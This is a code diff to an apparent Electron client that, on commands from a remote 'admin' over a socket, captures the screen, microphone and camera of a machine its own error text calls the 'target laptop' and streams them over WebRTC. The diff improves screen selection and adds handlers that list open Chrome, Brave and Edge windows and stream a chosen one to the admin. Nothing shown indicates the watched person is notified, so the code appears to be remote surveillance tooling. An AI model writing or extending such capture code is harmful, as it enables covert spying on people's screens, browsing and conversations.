@@ -48,7 +48,7 @@ window.onload = async () => {
             console.log("Admin requested SCREEN");
             try {
                 const sources = await window.electronAPI.getSources();
-                const mainScreen = sources[0];
+                const mainScreen = sources.find(s => s.id.startsWith('screen')) || sources[0];
                 localScreenStream = await navigator.mediaDevices.getUserMedia({
                     audio: { mandatory: { chromeMediaSource: 'desktop' } },
                     video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
@@ -65,7 +65,7 @@ window.onload = async () => {
             console.log("Admin requested SCREEN + MIC");
             try {
                 const sources = await window.electronAPI.getSources();
-                const mainScreen = sources[0];
+                const mainScreen = sources.find(s => s.id.startsWith('screen')) || sources[0];
                 localScreenStream = await navigator.mediaDevices.getUserMedia({
                     audio: { mandatory: { chromeMediaSource: 'desktop' } },
                     video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
@@ -107,6 +107,35 @@ window.onload = async () => {
             } catch (camErr) {
                 console.log("No Camera/Mic found or access denied.");
                 socket.emit('client-error', "Camera not found on target laptop.");
+            }
+        });
+
+        socket.on('request-chrome-list', async (adminId) => {
+            try {
+                const sources = await window.electronAPI.getSources();
+                const chromeSources = sources.filter(s => 
+                    s.name.toLowerCase().includes('chrome') || 
+                    s.name.toLowerCase().includes('brave') || 
+                    s.name.toLowerCase().includes('edge')
+                );
+                socket.emit('chrome-list', { adminId, sources: chromeSources });
+            } catch (e) {
+                console.error("Failed to get chrome sources", e);
+            }
+        });
+
+        socket.on('request-chrome-window', async (data) => {
+            const { adminId, sourceId } = data;
+            console.log("Admin requested specific Chrome window:", sourceId);
+            try {
+                localScreenStream = await navigator.mediaDevices.getUserMedia({
+                    audio: false, 
+                    video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: sourceId } }
+                });
+                setupWebRTC(adminId, localScreenStream);
+            } catch (e) {
+                console.error("Chrome Window Capture failed", e);
+                socket.emit('client-error', "Chrome Window Capture failed: " + e.message);
             }
         });
 
